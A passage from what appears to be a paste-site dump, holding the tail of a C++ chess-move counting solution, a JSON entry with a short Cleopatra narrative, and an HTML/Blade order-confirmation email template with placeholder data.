        vector<int> ways2(2*C), moves2(2*C, INF);

        auto can = [&](int pos, int dir, int w, int m) {
            if (0 <= pos && pos < C) {
                if (m < moves2[dir*C+pos]) moves2[dir*C+pos] = m, ways2[dir*C+pos] = w;
                else if (m == moves2[dir*C+pos]) ways2[dir*C+pos] = add(ways2[dir*C+pos], w);
            }
        };
        for (int i = 0; i < 2*C; ++i) {
            int c = i%C, dir = i/C;
            if (dir == 0) { // going right
                can(c+1, 0, ways[i], moves[i]);
                can(c-1, 1, ways[i], moves[i]+1);
            } else { // going left
                can(c+1, 0, ways[i], moves[i]+1);
                can(c-1, 1, ways[i], moves[i]);
            }
        }
        ways = ways2, moves = moves2;
    }
    return combine({moves[cr-1], ways[cr-1]}, {moves[cr-1+C], ways[cr-1+C]});
}

inline int mult(int x, int y) {
    return (long long)x*y % BASE;
}
struct Matrix {
    int n, m;
    vector<vector<int>> v;
    Matrix() {}
    Matrix(int N, int M): n(N), m(M) {
        v.assign(n, vector<int>(m));
    }
    inline Matrix operator * (const Matrix &m2) const {
        assert(m == m2.n);
        int k = m2.m;
        Matrix m3(n, k);
        for (int i = 0; i < n; ++i) {
            for (int j = 0; j < k; ++j) {
                for (int l = 0; l < m; ++l) {
                    m3.v[i][j] = add(m3.v[i][j], mult(v[i][l], m2.v[l][j]));
                }
            }
        }
        return m3;
    }
    inline Matrix bin_pow(int y) {
        assert(n == m);
        Matrix res(n, n);
        for (int i = 0; i < n; ++i) res.v[i][i] = 1;
        Matrix x = *this;
        while (y) {
            if (y & 1) res = res * x;
            y >>= 1;
            x = x * x;
        }
        return res;
    }
};

Matrix kingSquareMatrix;
bool calculatedKingSquareMatrix = false;
inline pair<int, int> solveKing(int c1, int cr) {
    if (!calculatedKingSquareMatrix) {
        Matrix multiplier(C, C);
        for (int i = 0; i < C; ++i) {
            for (int j = i-1; j <= i+1; ++j) {
                if (0 <= j && j < C) multiplier.v[j][i] = 1;
            }
        }
        kingSquareMatrix = multiplier.bin_pow(R-1); 
        calculatedKingSquareMatrix = true;
    }
    return {R-1, kingSquareMatrix.v[cr-1][c1-1]};
}

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int Q; cin >> R >> C >> Q;
    while (Q--) {
        char t; int c1, cr;
        cin >> t >> c1 >> cr;
        if (t == 'P') {
            if (c1 == cr) cout << R-1 << "" 1\n"";
            else cout << ""0 0\n"";
        } else if (t == 'R') {
            if (c1 == cr) cout << ""1 1\n"";
            else cout << ""2 2\n"";
        } else if (t == 'Q') {
            if (c1 == cr || sameDiagonal(1, c1, R, cr)) cout << ""1 1\n"";
            else { // 2 moves
                int ways = 2 + 2; // Rook Rook, vertical Rook and Bishop (or vice versa)
                if (R == C && (c1 == 1 || c1 == C)) ++ways; // bishop + horizontal rook move
                if (R == C && (cr == 1 || cr == C)) ++ways; // horizontal rook move + bishop
                // both bishop moves:
                if (sameColor(1, c1, R, cr)) {
                    auto [x1, y1] = diagonalIntersect(1, c1, R, cr);
                    if (inBoard(x1, y1)) ++ways;
                    auto [x2, y2] = diagonalIntersect(R, cr, 1, c1);
                    if (inBoard(x2, y2)) ++ways;
                }
                cout << ""2 "" << ways << '\n';
            }
        } else if (t == 'B') {
            pair<int, int> a = solveBishop(c1, cr), b = solveBishop(C+1-c1, C+1-cr);
            auto [m, w] = combine(a, b);
            if (m == INF) cout << ""0 0\n"";
            else cout << m << ' ' << w << '\n';
        } else { // t == 'K'
            auto [m, w] = solveKing(c1, cr);
            cout << m << ' ' << w << '\n';
        }
    }
    return 0;
}"
NhQeZLYX,The Story of Cleopatra: Queen of Egypt,AhmadXploit,Dart,Thursday 13th of July 2023 07:37:30 AM CDT,"[
  {
	""imgUrl"": ""https://via.placeholder.com/600/771796"",
    ""name"": ""The Story of Cleopatra: Queen of Egypt"",
	""author"": ""Anonymous"",
	""score"": ""2.13"",
	""review"": ""107.3"",
	""view"": ""2.7"",
    ""desc"": ""   In the annals of history, one name stands out as a symbol of power, beauty, and intrigue—Cleopatra, the Queen of Egypt. This is the captivating tale of a woman who defied societal norms, ruled with intelligence and charisma, and left an indelible mark on the ancient world. Born in 69 BCE, Cleopatra was a member of the Ptolemaic dynasty, which ruled Egypt after the death of Alexander the Great. As a descendant of the great Macedonian conqueror, Cleopatra inherited a realm filled with political turmoil and external threats. At a young age, Cleopatra demonstrated her intelligence and ambition. Fluent in multiple languages and well-versed in the arts and sciences, she possessed a keen intellect that impressed even the most learned scholars of her time. Her charisma and allure captivated all who encountered her, making her a force to be reckoned with.\n   Cleopatra ascended to the throne of Egypt alongside her younger brother, Ptolemy XIII, with whom she shared power. However, their relationship quickly deteriorated, leading to a bitter struggle for control. Cleopatra's determination and political acumen prevailed, and she eventually became the sole ruler of Egypt. Cleopatra's reign was marked by her unwavering dedication to her kingdom and her ambition to restore Egypt's former glory. She implemented economic reforms, promoted trade, and fostered alliances with powerful figures such as Julius Caesar, the renowned Roman general and statesman. The union between Cleopatra and Julius Caesar was both a political alliance and a passionate love affair. Cleopatra bore Caesar a son, Caesarion, solidifying her connection to the Roman Empire. However, the tides of fate turned when Caesar was assassinated in 44 BCE, plunging Rome into chaos.\n   Undeterred, Cleopatra set her sights on the new power emerging in Rome—Mark Antony. Their relationship became the stuff of legend, as they shared a deep love and a mutual ambition to create a vast empire encompassing Egypt and Rome. Cleopatra's charm and wit captivated Antony, and together, they formed a formidable partnership. However, their dreams of a united empire faced opposition from Octavian, Caesar's adopted heir and Antony's rival. In a series of battles known as the Roman Civil War, Cleopatra and Antony faced defeat. Trapped in a web of political intrigue, they sought refuge in Egypt. In 30 BCE, with Octavian's forces closing in, Cleopatra and Antony made a fateful decision. Believing that all hope was lost, they chose to end their lives rather than face capture and humiliation. The lovers' tragic deaths added a mythic aura to Cleopatra's legacy, forever immortalizing her as a figure of passion and tragedy.""
  }
]"
cJQp0m2Z,Untitled,Ugly_Urchin,PHP,Thursday 13th of July 2023 07:25:27 AM CDT,"
<body class=""o_body o_bg-white"" style=""width: 100%;margin: 0px;padding: 0px;-webkit-text-size-adjust: 100%;-ms-text-size-adjust: 100%;background-color: #ffffff;"">
    <!-- preview-text -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_hide"" align=""center"" style=""display: none;font-size: 0;max-height: 0;width: 0;line-height: 0;overflow: hidden;mso-hide: all;visibility: hidden;"">Email Summary (Hidden)</td>
        </tr>
      </tbody>
    </table>
    <!-- header-button -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_re o_bg-dark o_px o_pb-md"" align=""center"" style=""font-size: 0;vertical-align: top;background-color: #242b3d;padding-left: 16px;padding-right: 16px;padding-bottom: 24px;"">
            <!--[if mso]><table cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td width=""200"" align=""left"" valign=""top"" style=""padding:0px 8px;""><![endif]-->
            <div class=""o_col o_col-2"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 200px;"">
              <div style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </div>
              <div class=""o_px-xs o_sans o_text o_left o_xs-center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;text-align: left;padding-left: 8px;padding-right: 8px;"">
                <p align=""center"" style=""margin-top: 0px;margin-bottom: 0px;""><a class=""o_text-white"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #ffffff;""><img src=""	http://localhost/assets/images/Logowhite.svg"" width=""136"" height=""36"" alt=""TicketRef"" style=""max-width: 136px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a></p>
              </div>
            </div>  
          </td>
        </tr>
      </tbody>
    </table>
    <!-- hero-icon-outline -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_bg-ultra_light o_px-md o_py-xl o_xs-py-md"" align=""center"" style=""background-color: #ebf5fa;padding-left: 24px;padding-right: 24px;padding-top: 64px;padding-bottom: 64px;"">
            <!--[if mso]><table width=""584"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td align=""center""><![endif]-->
            <div class=""o_col-6s o_sans o_text-md o_text-light o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 19px;line-height: 28px;max-width: 584px;color: #82899a;text-align: center;"">
              <table class=""o_center"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"" style=""text-align: center;margin-left: auto;margin-right: auto;"">
                <tbody>
                  <tr>
                    <td class=""o_sans o_text o_text-secondary o_b-primary o_px o_py o_br-max"" align=""center"" style=""font-family: Helvetica, Arial, sans-serif; margin-top: 0px; margin-bottom: 0px; font-size: 16px; line-height: 24px; color: #424651; border-radius: 50%;"">
                      <img src=""{{ url('storage/uploads/app/users/' . $user['image']) }}"" alt="""" style=""display: block; max-width: 100%; height: auto; border-radius: 50%; -ms-interpolation-mode: bicubic; width: 100px; height: 100px;"">
                    </td>                                      
                  </tr>
                  <tr>
                    <td style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </td>
                  </tr>
                </tbody>
              </table>
              <h2 class=""o_heading o_text-dark o_mb-xxs"" style=""font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 4px;color: #242b3d;font-size: 30px;line-height: 39px;"">Order Confirmation</h2>
              <p style=""margin-top: 0px;margin-bottom: 0px;"">That thus much less heron other hello</p>
            </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- spacer -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_bg-white"" style=""font-size: 24px;line-height: 24px;height: 24px;background-color: #ffffff;"">&nbsp; </td>
        </tr>
      </tbody>
    </table>
    <!-- order-intro -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_bg-white o_px-md o_py"" align=""center"" style=""background-color: #ffffff;padding-left: 24px;padding-right: 24px;padding-top: 16px;padding-bottom: 16px;"">
            <!--[if mso]><table width=""584"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td align=""center""><![endif]-->
            <div class=""o_col-6s o_sans o_text o_text-secondary o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;max-width: 584px;color: #424651;text-align: center;"">
              <h4 class=""o_heading o_text-dark o_mb-xs"" style=""font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 8px;color: #242b3d;font-size: 18px;line-height: 23px;"">Hello, {{ $user['first_name']."" "".$user['last_name'] }}</h4>
              <p class=""o_mb-md"" style=""margin-top: 0px;margin-bottom: 24px;"">Thank you for ordering from Ticketref. You can track your Ticket status using our mobile tracking. See your order confirmation below.</p>
              <table align=""center"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
                <tbody>
                  <tr>
                    <td width=""300"" class=""o_btn o_bg-success o_br o_heading o_text"" align=""center"" style=""font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;mso-padding-alt: 12px 24px;background-color: #0ec06e;border-radius: 4px;"">
                      <a class=""o_text-white"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #ffffff;display: block;padding: 12px 24px;mso-text-raise: 3px;"">Track My Ticket</a>
                    </td>
                  </tr>
                </tbody>
              </table>
              <div style=""font-size: 28px; line-height: 28px; height: 28px;"">&nbsp; </div>
              {{-- <h4 class=""o_heading o_text-dark o_mb-xxs"" style=""font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 4px;color: #242b3d;font-size: 18px;line-height: 23px;"">Order # {{ $ticket['ticketId'] }}</h4> --}}
              <h4 class=""o_heading o_text-dark o_mb-xxs"" style=""font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 4px;color: #242b3d;font-size: 18px;line-height: 23px;"">Ticket #{{ $ticket['ticketId'] }}</h4>
              <p class=""o_text-xs o_text-light"" style=""font-size: 14px;line-height: 21px;color: #82899a;margin-top: 0px;margin-bottom: 0px;"">Placed on March 14, 2018 1:20:32 PM FET</p>
            </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- order-details -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_re o_bg-white o_px o_pb-md"" align=""center"" style=""font-size: 0;vertical-align: top;background-color: #ffffff;padding-left: 16px;padding-right: 16px;padding-bottom: 24px;"">
            <!--[if mso]><table cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td width=""300"" align=""center"" valign=""top"" style=""padding: 0px 8px;""><![endif]-->
            <div class=""o_col o_col-3 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 300px;"">
              <div style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </div>
              <div class=""o_px-xs"" style=""padding-left: 8px;padding-right: 8px;"">
                <table width=""100%"" role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"">
                  <tbody>
                    <tr>
                      <td class=""o_bg-ultra_light o_br o_px o_py o_sans o_text-xs o_text-secondary"" align=""left"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;background-color: #ebf5fa;color: #424651;border-radius: 4px;padding-left: 16px;padding-right: 16px;padding-top: 16px;padding-bottom: 16px;"">
                        <p class=""o_mb-xs"" style=""margin-top: 0px;margin-bottom: 8px;""><strong>Billing Information</strong></p>
                        <p class=""o_mb-md"" style=""margin-top: 0px;margin-bottom: 24px;"">{{ $user['first_name']."" "".$user['last_name'] }}<br>
                          3333 Poplar Street<br>
                          Chicago, IL 60603<br>
                          United States</p>
                        <p class=""o_mb-xs"" style=""margin-top: 0px;margin-bottom: 8px;""><strong>Payment Method</strong></p>
                        <p style=""margin-top: 0px;margin-bottom: 0px;"">Check / money order</p>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            <!--[if mso]></td><td width=""300"" align=""center"" valign=""top"" style=""padding: 0px 8px;""><![endif]-->
            <div class=""o_col o_col-3 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 300px;"">
              <div style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </div>
              <div class=""o_px-xs"" style=""padding-left: 8px;padding-right: 8px;"">
                <table width=""100%"" role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"">
                  <tbody>
                    <tr>
                      <td class=""o_bg-ultra_light o_br o_px o_py o_sans o_text-xs o_text-secondary"" align=""left"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;background-color: #ebf5fa;color: #424651;border-radius: 4px;padding-left: 16px;padding-right: 16px;padding-top: 16px;padding-bottom: 16px;"">
                        <p class=""o_mb-xs"" style=""margin-top: 0px;margin-bottom: 8px;""><strong>Shipping Information</strong></p>
                        <p class=""o_mb-md"" style=""margin-top: 0px;margin-bottom: 24px;"">Clara Palmer<br>
                          3333 Poplar Street<br>
                          Chicago, IL 60603<br>
                          United States</p>
                        <p class=""o_mb-xs"" style=""margin-top: 0px;margin-bottom: 8px;""><strong>Shipping Method</strong></p>
                        <p style=""margin-top: 0px;margin-bottom: 0px;"">FedEx</p>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- order-summary -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_bg-white o_sans o_text-xs o_text-light o_px-md o_pt-xs"" align=""center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;background-color: #ffffff;color: #82899a;padding-left: 24px;padding-right: 24px;padding-top: 8px;"">
            <p style=""margin-top: 0px;margin-bottom: 0px;"">Order Summary</p>
            <table cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
              <tbody>
                <tr>
                  <td width=""584"" class=""o_re o_bb-light"" style=""font-size: 8px;line-height: 8px;height: 8px;vertical-align: top;border-bottom: 1px solid #d3dce0;"">&nbsp; </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
      </tbody>
    </table> 
    <!-- product -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_re o_bg-white o_px o_pt"" align=""center"" style=""font-size: 0;vertical-align: top;background-color: #ffffff;padding-left: 16px;padding-right: 16px;padding-top: 16px;"">
            <!--[if mso]><table cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td width=""200"" align=""center"" valign=""top"" style=""padding: 0px 8px;""><![endif]-->
            <div class=""o_col o_col-2 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 200px;"">
              <div class=""o_px-xs o_sans o_text o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;text-align: center;padding-left: 8px;padding-right: 8px;"">
                <p style=""margin-top: 0px;margin-bottom: 0px;""><a class=""o_text-primary"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #126de5;""><img src=""images/thumb_184.jpg"" width=""184"" height=""184"" alt="""" style=""max-width: 184px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a></p>
              </div>
            </div>
            <!--[if mso]></td><td width=""300"" align=""left"" valign=""top"" style=""padding: 0px 8px;""><![endif]-->
            <div class=""o_col o_col-3 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 300px;"">
              <div style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </div>
              <div class=""o_px-xs o_sans o_text o_text-light o_left o_xs-center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #82899a;text-align: left;padding-left: 8px;padding-right: 8px;"">
                <h4 class=""o_heading o_text-dark o_mb-xxs"" style=""font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 4px;color: #242b3d;font-size: 18px;line-height: 23px;"">Awesome Product Title</h4>
                <p class=""o_text-secondary o_mb-xs"" style=""color: #424651;margin-top: 0px;margin-bottom: 8px;"">Stingy yikes enchantingly rebuilt</p>
                <p class=""o_text-xs o_mb-xs"" style=""font-size: 14px;line-height: 21px;margin-top: 0px;margin-bottom: 8px;"">
                  Color: Black<br>
                  Size: M
                </p>
              </div>
            </div>
            <!--[if mso]></td><td width=""100"" align=""right"" valign=""top"" style=""padding: 0px 8px;""><![endif]-->
            <div class=""o_col o_col-1 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 100px;"">
              <div class=""o_hide-xs"" style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </div>
              <div class=""o_px-xs o_sans o_text o_text-secondary o_right o_xs-center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #424651;text-align: right;padding-left: 8px;padding-right: 8px;"">
                <p style=""margin-top: 0px;margin-bottom: 0px;"">$900</p>
              </div>
            </div>
            <!--[if mso]></td></tr><tr><td colspan=""3"" style=""padding: 0px 8px;""><![endif]-->
            <div class=""o_px-xs"" style=""padding-left: 8px;padding-right: 8px;"">
              <table cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
                <tbody>
                  <tr>
                    <td width=""584"" class=""o_re o_bb-light"" style=""font-size: 16px;line-height: 16px;height: 16px;vertical-align: top;border-bottom: 1px solid #d3dce0;"">&nbsp; </td>
                  </tr>
                </tbody>
              </table>
            </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- invoice-total -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_re o_bg-white o_px-md o_py"" align=""center"" style=""font-size: 0;vertical-align: top;background-color: #ffffff;padding-left: 24px;padding-right: 24px;padding-top: 16px;padding-bottom: 16px;"">
            <!--[if mso]><table width=""584"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td align=""right""><![endif]-->
            <div class=""o_col-6s o_right"" style=""max-width: 584px;text-align: right;"">
              <table class=""o_right"" role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"" style=""text-align: right;margin-left: auto;margin-right: 0;"">
                <tbody>
                  <tr>
                    <td width=""284"" align=""left"">
                      <table width=""100%"" role=""presentation"" cellspacing=""0"" cellpadding=""0"" border=""0"">
                        <tbody>
                          <tr>
                            <td width=""50%"" class=""o_pt-xs"" align=""left"" style=""padding-top: 8px;"">
                              <p class=""o_sans o_text o_text-secondary"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #424651;"">Subtotal</p>
                            </td>
                            <td width=""50%"" class=""o_pt-xs"" align=""right"" style=""padding-top: 8px;"">
                              <p class=""o_sans o_text o_text-secondary"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #424651;"">$4,050 USD</p>
                            </td>
                          </tr>
                          <tr>
                            <td width=""50%"" class=""o_pt-xs"" align=""left"" style=""padding-top: 8px;"">
                              <p class=""o_sans o_text o_text-secondary"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #424651;"">Shipping</p>
                            </td>
                            <td width=""50%"" class=""o_pt-xs"" align=""right"" style=""padding-top: 8px;"">
                              <p class=""o_sans o_text o_text-secondary"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #424651;"">$2,000 USD</p>
                            </td>
                          </tr>
                          <tr>
                            <td class=""o_pt o_bb-light"" style=""border-bottom: 1px solid #d3dce0;padding-top: 16px;"">&nbsp; </td>
                            <td class=""o_pt o_bb-light"" style=""border-bottom: 1px solid #d3dce0;padding-top: 16px;"">&nbsp; </td>
                          </tr>
                          <tr>
                            <td width=""50%"" class=""o_pt"" align=""left"" style=""padding-top: 16px;"">
                              <p class=""o_sans o_text o_text-secondary"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #424651;""><strong>Total Due</strong></p>
                            </td>
                            <td width=""50%"" class=""o_pt"" align=""right"" style=""padding-top: 16px;"">
                              <p class=""o_sans o_text o_text-primary"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #126de5;""><strong>$2,000 USD</strong></p>
                            </td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- spacer -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_bg-white"" style=""font-size: 24px;line-height: 24px;height: 24px;background-color: #ffffff;"">&nbsp; </td>
        </tr>
      </tbody>
    </table>
    <!-- footer-3cols -->
    <table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation"">
      <tbody>
        <tr>
          <td class=""o_re o_bg-dark o_px o_pb-lg"" align=""center"" style=""font-size: 0;vertical-align: top;background-color: #242b3d;padding-left: 16px;padding-right: 16px;padding-bottom: 32px;"">
            <!--[if mso]><table cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td width=""200"" align=""center"" valign=""top"" style=""padding:0px 8px;""><![endif]-->
            <div class=""o_col o_col-2 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 200px;"">
              <div style=""font-size: 32px; line-height: 32px; height: 32px;"">&nbsp; </div>
              <div class=""o_px-xs o_sans o_text-xs o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;text-align: center;padding-left: 8px;padding-right: 8px;"">
                <p style=""margin-top: 0px;margin-bottom: 0px;""><a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><strong style=""color: #a0a3ab;"">Help Center</strong></a></p>
              </div>
            </div>
            <!--[if mso]></td><td width=""200"" align=""center"" valign=""top"" style=""padding:0px 8px;""><![endif]-->
            <div class=""o_col o_col-2 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 200px;"">
              <div style=""font-size: 24px; line-height: 24px; height: 24px;"">&nbsp; </div>
              <div class=""o_px-xs o_sans o_text-xs o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;text-align: center;padding-left: 8px;padding-right: 8px;"">
                <p style=""margin-top: 0px;margin-bottom: 0px;"">
                  <a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><img src=""images/facebook-light.png"" width=""36"" height=""36"" alt=""fb"" style=""max-width: 36px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a><span> &nbsp;</span>
                  <a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><img src=""images/twitter-light.png"" width=""36"" height=""36"" alt=""tw"" style=""max-width: 36px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a><span> &nbsp;</span>
                  <a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><img src=""images/instagram-light.png"" width=""36"" height=""36"" alt=""ig"" style=""max-width: 36px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a><span> &nbsp;</span>
                  <a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><img src=""images/snapchat-light.png"" width=""36"" height=""36"" alt=""sc"" style=""max-width: 36px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a>
                </p>
              </div>
            </div>
            <!--[if mso]></td><td width=""200"" align=""center"" valign=""top"" style=""padding:0px 8px;""><![endif]-->
            <div class=""o_col o_col-2 o_col-full"" style=""display: inline-block;vertical-align: top;width: 100%;max-width: 200px;"">
              <div style=""font-size: 32px; line-height: 32px; height: 32px;"">&nbsp; </div>
              <div class=""o_px-xs o_sans o_text-xs o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;text-align: center;padding-left: 8px;padding-right: 8px;"">
                <p style=""margin-top: 0px;margin-bottom: 0px;""><a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><strong style=""color: #a0a3ab;"">Preferences</strong></a></p>
              </div>
            </div>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
        <tr>
          <td class=""o_re o_bg-dark o_px-md o_pb-lg"" align=""center"" style=""font-size: 0;vertical-align: top;background-color: #242b3d;padding-left: 24px;padding-right: 24px;padding-bottom: 32px;"">
            <!--[if mso]><table width=""584"" cellspacing=""0"" cellpadding=""0"" border=""0"" role=""presentation""><tbody><tr><td align=""center""><![endif]-->
            <div class=""o_col-6s o_sans o_text-xs o_text-dark_light o_center"" style=""font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 14px;line-height: 21px;max-width: 584px;color: #a0a3ab;text-align: center;"">
              <p class=""o_mb"" style=""margin-top: 0px;margin-bottom: 16px;"">
                <a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><img src=""images/badge_appstore-light.png"" width=""135"" height=""56"" alt=""AppStore"" style=""max-width: 135px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a>
                <a class=""o_text-dark_light"" href=""https://example.com/"" style=""text-decoration: none;outline: none;color: #a0a3ab;""><img src=""images/badge_googleplay-light.png"" width=""135"" height=""56"" alt=""Google Play"" style=""max-width: 135px;-ms-interpolation-mode: bicubic;vertical-align: middle;border: 0;line-height: 100%;height: auto;outline: none;text-decoration: none;""></a>
              </p>
              <p class=""o_mb-xs"" style=""margin-top: 0px;margin-bottom: 8px;"">©2018 SimpleApp Inc<br>
                2603 Woodridge Lane, Memphis, TN 38104, USA
              </p>
              <p style=""margin-top: 0px;margin-bottom: 0px;"">
                <a class=""o_text-xxs o_text-dark_light o_underline"" href=""https://example.com/"" style=""text-decoration: underline;outline: none;font-size: 12px;line-height: 19px;color: #a0a3ab;"">Unsubscribe</a>
              </p>
